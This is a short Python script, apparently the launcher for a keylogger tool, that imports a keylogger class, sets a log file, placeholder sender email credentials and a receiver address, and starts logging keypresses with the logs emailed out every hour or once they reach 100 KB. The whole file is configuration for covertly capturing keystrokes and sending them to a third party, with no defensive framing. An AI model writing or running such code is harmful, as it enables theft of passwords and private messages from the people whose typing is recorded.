from keylogger import keylogger

log_file_name = "keypresses.log"
sender_mail = ""
sender_password = ""
receiver_mail = ""
mail_subject = "logs"

wait_time_to_send = 60 * 60    # seconds (1 hour)
file_size_to_send = 1000 * 100  # bytes (100 kb)

klogger = keylogger(log_file_name, sender_mail, sender_password, receiver_mail, mail_subject, wait_time_to_send, file_size_to_send)
klogger.start()